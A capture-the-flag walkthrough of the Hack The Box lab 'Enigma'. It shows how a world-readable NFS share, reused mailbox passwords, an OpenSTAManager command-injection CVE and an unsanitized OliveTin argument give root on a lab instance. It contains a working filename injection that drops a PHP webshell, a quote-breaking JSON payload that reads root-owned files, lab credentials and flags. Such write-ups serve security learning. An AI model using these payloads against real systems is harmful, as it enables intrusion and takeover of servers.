# Walkthrough: Enigma (HTB #915)

**Status: PWNED — user + root, 2026-08-29** ✅

- **Target:** `10.129.106.128` (our own spawned lab instance)
- **Flags:** user `4ba973…` · root `5721fd…` (both submitted and accepted;
  full values live in [../flags.log](../flags.log))
- **Attack chain in one sentence:** an **NFS share** leaked onboarding PDF creds for
  **kevin**, his mailbox pointed us to **sarah**, her IT email gave **OpenSTAManager**
  admin creds, we exploited **CVE-2025-69212** for RCE, pivoted to local user **haris**,
  then abused **OliveTin** command injection on loopback to read root.

---

## Setting the scene: what is this box?

**Enigma** is a fictional company with a marketing site, corporate email, and an IT
support portal. The main homepage is a decoy — the real story starts with a
misconfigured **NFS export** and **password reuse** through employee mailboxes.

| Layer | What we found |
|---|---|
| Web | **nginx 1.24.0** — vhosts: `enigma.htb`, `mail001.enigma.htb`, `support_001.enigma.htb` |
| Mail | Dovecot IMAP/POP3 (143/993/995/110) + Roundcube on `mail001` |
| Support app | **OpenSTAManager 2.9.8** on `support_001.enigma.htb` |
| File sharing | **NFS** port 2049 — `/srv/nfs/onboarding` exported to `*` |
| SSH | OpenSSH 9.6p1 — publickey only |
| Hidden | **OliveTin** on `127.0.0.1:1337` — root-owned, auth disabled |

The box is won by following **credentials from one service to the next**, not by
brute-forcing SSH.

---

## Recon — mapping the outside

| Port | Service | Why it matters |
|---|---|---|
| 22 | OpenSSH | Locked down — pubkey only |
| 80 | nginx | Multiple **vhosts** behind one IP |
| 110/143/993/995 | Dovecot | Corporate email |
| 111/2049 | rpcbind/NFS | **World-readable file share** |

One IP serves three websites — you need the right **Host header** to reach each app:

```bash
curl -H "Host: mail001.enigma.htb" http://10.129.106.128/
curl -H "Host: support_001.enigma.htb" http://10.129.106.128/
```

Add to `/etc/hosts`:

```
10.129.106.128 enigma.htb mail001.enigma.htb support_001.enigma.htb
```

| Vhost | App |
|---|---|
| `enigma.htb` | Static marketing site |
| `mail001.enigma.htb` | Roundcube webmail |
| `support_001.enigma.htb` | OpenSTAManager IT portal |

---

## Enumeration — NFS PDF creds

NFS (Network File System) shares folders over the network. When the export list
shows `*`, **anyone on the lab network** can mount it — no password.

```bash
showmount -e 10.129.106.128
# /srv/nfs/onboarding *

sudo mkdir -p /mnt/enigma_nfs
sudo mount -t nfs 10.129.106.128:/srv/nfs/onboarding /mnt/enigma_nfs
ls /mnt/enigma_nfs
# New_Employee_Access.pdf
```

The PDF is an onboarding doc. Inside:

- **Username:** `kevin`
- **Password:** `Enigma2024!`
- **Webmail:** `http://mail001.enigma.htb`

Plain English: HR left the welcome pack on a **public file share**. Anyone who
mounts NFS gets Kevin's mailbox password.

---

## Mail pivot — kevin → sarah → admin

Email is reachable via **Roundcube** (port 80 vhost) or **IMAPS** (port 993).
Creds are the same either way.

### Kevin's mailbox

- **Login:** `kevin` / `Enigma2024!`
- **INBOX (1 msg):** Welcome from **`sarah@enigma.htb`** — mentions IT will
  deliver creds via the company shared drive (the NFS export we already read).

We now know **sarah exists** and likely shares the same weak onboarding password.

### Sarah's mailbox — password reuse

- **Login:** `sarah` / `Enigma2024!`
- **INBOX (1 msg):** IT reply with OpenSTAManager credentials:

| Field | Value |
|---|---|
| URL | `http://support_001.enigma.htb` |
| Username | `admin` |
| Password | `Ne3s4rtars78s` |

Two mailbox hops, zero exploits — just reading email.

---

## Foothold — OpenSTAManager CVE-2025-69212

**OpenSTAManager 2.9.8** is vulnerable to **CVE-2025-69212**: **OS command injection**
in `XML::decodeP7M()` via a malicious `.p7m` **filename** inside an uploaded ZIP
(`importFE_ZIP` plugin).

Plain English: the app imports a ZIP of invoices. Craft a filename that breaks out
of the shell command and you get **RCE** as `www-data`.

**Exploit params:** Module ID **14**, Plugin ID **48**. Malicious filename:

```
1.p7m";cd files;echo '<?php system($_GET[0]); ?>'>s.php;echo "1.p7m
```

Log in as `admin` / `Ne3s4rtars78s`, trigger the import, then:

```bash
curl --resolve support_001.enigma.htb:80:10.129.106.128 \
  "http://support_001.enigma.htb/files/s.php?0=id"
# uid=33(www-data) gid=33(www-data) ...
```

Webshell: `http://support_001.enigma.htb/files/s.php?0=<cmd>`

Automated chain: [../boxes/enigma/exploit.py](../boxes/enigma/exploit.py)

---

## User flag — pivot to haris

`www-data` cannot read `/home/haris/user.txt`. We need a **real local user**.

OpenSTAManager config/database (reachable from the webshell) reveals **`haris`** /
**`bestfriends`**. SSH password auth is disabled, so pivot via `su` from the webshell
— upload `/tmp/run.py` to automate the password prompt.

Once we are `haris`:

```bash
cat /home/haris/user.txt
# 4ba97310f3701a33cf4ed23445445621   → submitted, accepted ✅
```

Masked for notes: `4ba973…`

---

## Root — OliveTin command injection

**OliveTin** is a web UI for running predefined shell commands. On Enigma it listens
on **`127.0.0.1:1337`** (loopback only) and runs as **root**. Two misconfigs:

1. **Authentication disabled** — no login required.
2. `backup_database` passes `db_pass` **unsanitized** into a shell command.

Plain English: a root-owned "run backup" button splices your password straight into
a shell one-liner — classic **command injection**.

From haris's shell:

```bash
curl -s http://127.0.0.1:1337/api/Action \
  -H "Content-Type: application/json" \
  -d '{
    "actionId": "backup_database",
    "arguments": [
      {"name": "db_user", "value": "backup_svc"},
      {"name": "db_pass", "value": "x'"'"' ; cat /root/root.txt ; #"},
      {"name": "db_name", "value": "production"}
    ]
  }'
```

The `db_pass` breaks out of quotes, runs `cat /root/root.txt`, comments out the rest.
Flag appears in the action output:

```bash
# 5721fdebe7c02204cba46ff9c993a7aa   → submitted, accepted ✅
```

Masked for notes: `5721fd…`

---

## Lessons to remember

> 1. **NFS exports to `*`** — always `showmount -e` and mount; PDFs often hold creds.
> 2. **Password reuse chains mailboxes** — `Enigma2024!` unlocked kevin *and* sarah.
> 3. **Email is enumeration** — INBOX messages are cred delivery logs.
> 4. **Webshell → local user** — web apps often store host creds in their database.
> 5. **Loopback services** — OliveTin on `:1337` was invisible externally but trivial
>    with a user shell; unsanitized args in admin UIs = root RCE.

---

## Appendix: submitting flags

```bash
./htb/scripts/own.sh 915 enigma user 4ba97310f3701a33cf4ed23445445621  # accepted
./htb/scripts/own.sh 915 enigma root 5721fdebe7c02204cba46ff9c993a7aa  # accepted
```
